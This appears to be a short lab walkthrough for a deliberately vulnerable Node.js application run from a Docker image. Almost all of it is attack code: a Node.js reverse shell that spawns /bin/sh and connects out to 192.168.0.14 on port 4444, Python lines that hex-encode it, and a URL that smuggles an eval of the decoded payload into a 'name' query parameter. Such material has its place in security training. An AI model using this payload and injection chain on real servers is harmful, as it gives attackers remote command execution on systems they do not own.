docker run -p 3000:3000 appsecco/node-reverse-shell

python >>> payload = '''(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.0.14", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();'''

python >>> payload.encode('hex')

http://localhost:3000/?name=["./;eval(new Buffer('', 'hex').toString());//*"]
